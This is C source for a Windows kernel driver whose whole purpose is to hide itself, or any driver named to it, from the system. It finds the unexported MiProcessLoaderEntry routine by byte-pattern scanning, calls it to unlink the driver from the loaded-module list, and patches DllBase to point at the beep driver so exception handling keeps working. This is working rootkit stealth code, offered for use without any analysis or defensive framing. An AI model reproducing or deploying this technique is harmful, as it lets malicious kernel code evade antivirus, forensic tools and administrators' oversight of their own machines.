#include <ntifs.h>

#define DRIVER_NAME L"CatDriver.sys"

extern POBJECT_TYPE* IoDriverObjectType;

typedef NTSTATUS(__fastcall* pfnMiProcessLoaderEntry)(PVOID pDriverSection, LOGICAL IsLoad);

NTSYSAPI NTSTATUS NTAPI ObReferenceObjectByName(
    __in PUNICODE_STRING ObjectName,
    __in ULONG Attributes,
    __in_opt PACCESS_STATE AccessState,
    __in_opt ACCESS_MASK DesiredAccess,
    __in POBJECT_TYPE ObjectType,
    __in KPROCESSOR_MODE AccessMode,
    __inout_opt PVOID ParseContext,
    __out PVOID* Object
);

typedef struct _LDR_DATA_TABLE_ENTRY // LDTE
{
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID      DllBase;
    PVOID      EntryPoint;
}LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;



PVOID GetMiProcessLoaderEntry()
{
    UNICODE_STRING         FuncName 		   = { 0 };
    PUCHAR 		   pfnMmUnloadSystemImage  = NULL;
    PUCHAR 		   pfnMiUnloadSystemImage  = NULL;
    PUCHAR 		   pfnMiProcessLoaderEntry = NULL;

    RtlInitUnicodeString( &FuncName, L"MmUnloadSystemImage" );
    pfnMmUnloadSystemImage = MmGetSystemRoutineAddress(&FuncName);

    if ( pfnMmUnloadSystemImage && MmIsAddressValid( pfnMmUnloadSystemImage ) && MmIsAddressValid( (PVOID)((ULONG64)pfnMmUnloadSystemImage + 0xFF) ) )
    {
        /*
        PAGE:00000001403B1D80 48 8B D8                          mov     rbx, rax
        PAGE:00000001403B1D83 E8 D0 10 03 00                    call    MiUnloadSystemImage
        PAGE:00000001403B1D88 48 8B CB                          mov     rcx, rbx
        */
        for ( PUCHAR start = pfnMmUnloadSystemImage; start < pfnMmUnloadSystemImage + 0xFF; ++start )
        {
            if ( *(PULONG)start == 0xE8D88B48 && *(PUINT16)( start + 8 ) == 0x8B48 && start[0xA] == 0xCB )
            {
                start += 3;
                pfnMiUnloadSystemImage = start + *(PLONG)( start + 1 ) + 5;
                KdPrint( ( "pfnMiUnloadSystemImage = %p\n", pfnMiUnloadSystemImage ) );
            }
        }
    }
    KdPrint(("enter\n"));

    if ( pfnMiUnloadSystemImage && MmIsAddressValid( pfnMiUnloadSystemImage ) && MmIsAddressValid( (PVOID)((ULONG64)pfnMiUnloadSystemImage + 0x600 ) ) )
    {
        //MiUnloadSystemImage
        //System        Length
        //15063         0X4FA
        //19043         0x69B
        //22000         0x7EF

        /*
                15063   19043   22000
        PAGE:00000001406EFE20                   loc_1406EFE20:                          ; CODE XREF: MiUnloadSystemImage+481↑j
        PAGE:00000001406EFE20                                                           ; MiUnloadSystemImage+49A↑j
        PAGE:00000001406EFE20 48 83 3B 00                       cmp     qword ptr [rbx], 0
        PAGE:00000001406EFE24 74 54                             jz      short loc_1406EFE7A
        PAGE:00000001406EFE26 33 D2                             xor     edx, edx
        PAGE:00000001406EFE28 48 8B CB                          mov     rcx, rbx
        PAGE:00000001406EFE2B E8 A4 F1 C7 FF                    call    MiProcessLoaderEntry
        PAGE:00000001406EFE30 8B 05 4A C6 60 00                 mov     eax, dword ptr cs:PerfGlobalGroupMask
        PAGE:00000001406EFE36 A8 04                             test    al, 4
        */

        for ( PUCHAR start = pfnMiUnloadSystemImage; start < pfnMiUnloadSystemImage + 0x600; ++start )
        {
            if (*(PUINT16)start == 0xD233 && *(PULONG)( start + 2 ) == 0xE8CB8B48 && *(PUINT16)( start + 0xA ) == 0x058B && *(PUINT16)( start + 0x10 ) == 0x04A8)
            {
                start += 5;
                pfnMiProcessLoaderEntry = start + *(PLONG)( start + 1 ) + 5;
                KdPrint( ( "pfnMiProcessLoaderEntry = %p\n", pfnMiProcessLoaderEntry) );
                return pfnMiProcessLoaderEntry;
            }
        }
    }
    return NULL;
}

NTSTATUS GetDriverObjectByName(PDRIVER_OBJECT* DriverObject, WCHAR* DriverName)
{
    UNICODE_STRING uDriverName = { 0 };
    PDRIVER_OBJECT TempObject  = NULL;
    NTSTATUS       status      = STATUS_UNSUCCESSFUL;

    RtlInitUnicodeString( &uDriverName, DriverName );
	
    status = ObReferenceObjectByName( &uDriverName, OBJ_CASE_INSENSITIVE, NULL, 0, *IoDriverObjectType, KernelMode, NULL, &TempObject );
	
    if ( ! NT_SUCCESS( status ) ) {
        KdPrint(("ObReferenceObjectByName failed\n"));
        *DriverObject = NULL;
        return status;
    }
    *DriverObject = TempObject;
	
    return status;
}

BOOLEAN SupportSEH(PDRIVER_OBJECT DriverObject)
{
    PDRIVER_OBJECT        BeepDriverObject = NULL;;
    PLDR_DATA_TABLE_ENTRY LdrEntry         = NULL;

    GetDriverObjectByName( &BeepDriverObject, L"\\Driver\\beep" );
    if ( BeepDriverObject == NULL )
        return FALSE;

    LdrEntry          = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
    LdrEntry->DllBase = BeepDriverObject->DriverStart;
    ObDereferenceObject( BeepDriverObject );
	
    return TRUE;
}


VOID DriverReinitialize(PDRIVER_OBJECT DriverObject, PVOID Context, ULONG Count)
{
    pfnMiProcessLoaderEntry MiProcessLoaderEntry = NULL;
    PLDR_DATA_TABLE_ENTRY   LdrEntry             = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;

    MiProcessLoaderEntry = GetMiProcessLoaderEntry();
    if ( ! MiProcessLoaderEntry ){
        KdPrint( ( "GetMiProcessLoaderEntry failed\n") );
        return;
    }
    MiProcessLoaderEntry( DriverObject->DriverSection, 0 );
    SupportSEH(DriverObject);
}

NTSTATUS HideDriverByName(PWCHAR szDriverName)
{
   PDRIVER_OBJECT  DriverObject = NULL;
    NTSTATUS       status       = STATUS_SUCCESS;

    status = GetDriverObjectByName( &DriverObject, szDriverName );
    if ( ! NT_SUCCESS( status ) ) {
        return status;
    }
    HideDriver( DriverObject );

    return status;
}


NTSTATUS HideDriver(PDRIVER_OBJECT DriverObject)
{
    NTSTATUS status = STATUS_SUCCESS;
    if ( ! MmIsAddressValid( DriverObject ) ) {
        return STATUS_INVALID_PARAMETER;
    }
    IoRegisterDriverReinitialization( DriverObject, DriverReinitialize, NULL );

    return status;
}

NTSTATUS DriverUnload(PDRIVER_OBJECT pDrvObj)
{
	NTSTATUS ntstatus = STATUS_SUCCESS;

	return ntstatus;
}


NTSTATUS DriverEntry(PDRIVER_OBJECT pDrvObj, PUNICODE_STRING pRegPath)
{
	NTSTATUS status = STATUS_SUCCESS;

	pDrvObj->DriverUnload = DriverUnload;

	HideDriver(pDrvObj);

	return status;
}
